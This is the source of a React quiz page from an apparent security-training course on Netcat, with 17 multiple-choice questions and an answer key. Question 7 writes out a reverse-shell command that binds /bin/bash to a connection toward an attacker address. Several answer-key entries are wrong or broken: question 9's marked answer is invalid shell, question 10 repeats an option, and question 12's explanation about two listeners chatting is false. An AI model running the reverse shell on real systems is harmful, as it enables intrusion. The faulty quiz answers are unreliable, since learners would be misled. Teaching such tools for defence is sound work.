'use client'
import { useEffect } from 'react';
import DocHeading from '@/components/base/DocHeading';
import ModuleQuiz from '@/components/base/ModuleQuiz';
import { motion } from 'framer-motion';

const fadeUp = {
  hidden: { opacity: 0, y: 24 },
  visible: { opacity: 1, y: 0 },
};

const netcatQuizQuestions = [
  {
    id: 1,
    question: 'What is the primary purpose of Netcat?',
    options: ['Port scanning', 'Vulnerability exploitation', 'Reading and writing network connections', 'Packet sniffing'],
    correct: 2,
    explanation: 'Netcat is a versatile networking utility designed for reading from and writing to network connections using TCP or UDP.',
  },
  {
    id: 2,
    question: 'Which command would you use to listen for incoming TCP connections on port 4444?',
    options: ['nc -l 4444', 'nc -p 4444', 'nc -s 4444', 'nc -P 4444'],
    correct: 0,
    explanation: 'The -l flag tells Netcat to listen for incoming connections. The port number follows the flag.',
  },
  {
    id: 3,
    question: 'How would you use Netcat to transfer a file named secrets.txt from host A to host B?',
    options: [
      'Host A: nc -l 4444 < secrets.txt | Host B: nc hostA 4444 > secrets.txt',
      'Host A: nc hostB 4444 < secrets.txt | Host B: nc -l 4444 > secrets.txt',
      'Host A: nc -l 4444 > secrets.txt | Host B: nc hostA 4444 < secrets.txt',
      'Host A: nc hostB 4444 > secrets.txt | Host B: nc -l 4444 < secrets.txt'
    ],
    correct: 1,
    explanation: 'On the receiving host (B), start listening: nc -l 4444 > secrets.txt. On the sending host (A), connect and send: nc hostB 4444 < secrets.txt.',
  },
  {
    id: 4,
    question: 'Which flag enables UDP mode in Netcat?',
    options: ['-u', '-U', '--udp', '-d'],
    correct: 0,
    explanation: 'The -u flag tells Netcat to use UDP instead of the default TCP protocol.',
  },
  {
    id: 5,
    question: 'What does the -v flag do in Netcat?',
    options: ['Enables verbose output', 'Sets the source port', 'Disables DNS resolution', 'Sets timeout values'],
    correct: 0,
    explanation: 'The -v flag enables verbose mode, providing more detailed output about connections and data transferred.',
  },
  {
    id: 6,
    question: 'How would you perform a simple TCP port scan on host 192.168.1.1 for ports 80 and 443 using Netcat?',
    options: [
      'nc -zv 192.168.1.1 80 443',
      'nc -l 192.168.1.1 80 443',
      'nc -u 192.168.1.1 80 443',
      'nc -v 192.168.1.1 80-443'
    ],
    correct: 0,
    explanation: 'The -z flag enables zero-I/O mode (scan only), and -v provides verbose output showing which ports are open.',
  },
  {
    id: 7,
    question: 'Which command creates a reverse shell using Netcat (attacker listening on 4444)?',
    options: [
      'nc -lvp 4444 -e /bin/bash',
      'nc -e /bin/bash 192.168.1.100 4444',
      'nc -lvp 4444 | /bin/bash',
      '/bin/bash | nc -lvp 4444'
    ],
    correct: 1,
    explanation: 'On the target system: nc -e /bin/bash <attacker_ip> 4444. The attacker listens: nc -lvp 4444.',
  },
  {
    id: 8,
    question: 'What is the purpose of the -w flag in Netcat?',
    options: ['Sets window size', 'Enables wide output', 'Sets timeout for connections', 'Disables warnings'],
    correct: 2,
    explanation: 'The -w flag sets a timeout for connections and netcat reads. Example: -w5 sets a 5-second timeout.',
  },
  {
    id: 9,
    question: 'How would you use Netcat to grab a banner from an HTTP server on port 80?',
    options: [
      'nc example.com 80 < GET / HTTP/1.0\r\n\r\n',
      'nc -v example.com 80',
      'nc -l 80 < example.com',
      'nc example.com 80 && echo "GET / HTTP/1.0"'
    ],
    correct: 0,
    explanation: 'Connect to the service and send a valid HTTP request: nc example.com 80, then type GET / HTTP/1.0 followed by Enter twice.',
  },
  {
    id: 10,
    question: 'Which flag allows Netcat to stay listening after a client disconnects?',
    options: ['-k', '-K', '--keepalive', '-k'],
    correct: 0,
    explanation: 'The -k flag forces Netcat to stay listening for another connection after the current client disconnects.',
  },
  {
    id: 11,
    question: 'What does the -s flag specify in Netcat?',
    options: ['Source port', 'Source IP address', 'Socket buffer size', 'Sync mode'],
    correct: 1,
    explanation: 'The -s flag specifies the source IP address for the connection.',
  },
  {
    id: 12,
    question: 'Which mode would you use to create a simple chat server with Netcat?',
    options: [
      'nc -l 4444 | nc -l 4445',
      'nc -l 4444',
      'nc -u -l 4444',
      'nc -l 4444 > chat.log'
    ],
    correct: 1,
    explanation: 'Two instances of netcat listening on the same port can chat: one on each host runs: nc -l 4444.',
  },
  {
    id: 13,
    question: 'How do you save all Netcat output (including errors) to a file?',
    options: [
      'nc host port > output.txt',
      'nc host port 2> output.txt',
      'nc host port &> output.txt',
      'nc host port | tee output.txt'
    ],
    correct: 2,
    explanation: 'The &> operator redirects both stdout and stderr to the file (bash/zsh). In sh: > output.txt 2>&1.',
  },
  {
    id: 14,
    question: 'What is the difference between nc -l -p 4444 and nc -l 4444?',
    options: [
      '-p specifies the source port, while without it uses a random port',
      'They are functionally identical',
      '-p specifies the destination port',
      'The first is invalid syntax'
    ],
    correct: 1,
    explanation: 'In Netcat traditional, -l and -p together listen on the specified port. The -p flag is redundant here but not invalid.',
  },
  {
    id: 15,
    question: 'Which statement about Netcat encryption is true?',
    options: [
      'Netcat supports AES-256 encryption natively',
      'Netcat has no built-in encryption; use with SSL/TLS wrappers like stunnel or cryptcat',
      'Netcat encrypts all traffic by default',
      'Encryption is enabled with the -e flag'
    ],
    correct: 1,
    explanation: 'Netcat itself provides no encryption. For encrypted connections, use tools like stunnel, sslwrap, or cryptcat.',
  },
  {
    id: 16,
    question: 'How would you use Netcat to create a simple HTTP server serving a file?',
    options: [
      'nc -l 8080 < index.html',
      'nc -l 8080 > index.html',
      'while true; do nc -l 8080 < index.html; done',
      'nc -l 8080 -e /bin/cat index.html'
    ],
    correct: 2,
    explanation: 'A loop that repeatedly listens and sends the file: while true; do nc -l 8080 < index.html; done.',
  },
  {
    id: 17,
    question: 'What does the -n flag do in Netcat?',
    options: [
      'Enables numeric-only IP addresses (no DNS resolution)',
      'Sets the number of connections',
      'Enables non-blocking mode',
      'Specifies the netcat version'
    ],
    correct: 0,
    explanation: 'The -n flag disables DNS resolution, causing Netcat to treat all addresses as numeric IP addresses only.',
  },
];

export default function NetcatQuizPage() {
  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  return (
    <div className="px-6 md:px-12 lg:px-16 py-10 max-w-5xl">
      <motion.div initial="hidden" animate="visible" variants={fadeUp} transition={{ duration: 0.5 }}>
        <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-cyber-red/10 border border-cyber-red/20 text-cyber-red text-xs font-medium font-mono mb-4">
          <i className="ri-questionnaire-line" />
          Netcat Section 12 of 14
        </div>
        <DocHeading level={1}>Netcat Quiz</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3 text-lg">
          Test your understanding of Netcat with 17 multiple-choice questions covering basic usage, connection types, file transfer, port scanning, and advanced techniques. You need 80% to pass.
        </p>
      </motion.div>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <ModuleQuiz title="Netcat Knowledge Check" questions={netcatQuizQuestions} />
      </motion.section>

      <motion.section className="mt-8 mb-16" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <div className="flex gap-3">
          <a href="/netcat/lab" className="px-5 py-2.5 rounded-lg bg-cyber-red text-white text-sm font-semibold hover:bg-cyber-red/80 transition-all whitespace-nowrap">
            Next: Lab Exercises <i className="ri-arrow-right-line ml-1" />
          </a>
          <a href="/netcat/pro-tips" className="px-5 py-2.5 rounded-lg border border-cyber-border text-sm font-semibold text-cyber-text hover:border-cyber-red hover:text-cyber-red transition-all whitespace-nowrap">
            <i className="ri-arrow-left-line mr-1" /> Back
          </a>
        </div>
      </motion.section>
    </div>
  );
}